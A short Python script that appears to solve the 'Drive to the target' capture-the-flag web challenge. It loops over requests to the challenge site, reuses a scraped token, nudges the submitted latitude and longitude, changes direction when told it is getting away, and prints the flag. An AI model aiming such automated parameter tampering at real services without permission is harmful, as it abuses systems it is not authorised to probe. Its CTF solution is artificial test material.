import requests as req
import re
import time
import random

url = 'https://drivetothetarget.web.ctfcompetition.com/'
x = req.get(url)
la, lo = 1, 0
while True:
    par = re.findall('value="(.*?)"',x.text)
    params = {}
    params['token']=par[2]
    params['lat']=float(par[0])-la*0.00004
    params['lon']=float(par[1])-lo*0.00004

    x = req.get(url,params=params)

    give_me_flag = re.findall(r'CTF{.*?}',x.text)
    if give_me_flag:
        print(give_me_flag[0])
        break

    if 'You are getting away' in x.text:
        while True:
            la, lo = random.choice([-1,0,1]), random.choice([-1,0,1])
            if la*lo != 0:
                break
    time.sleep(0.2)
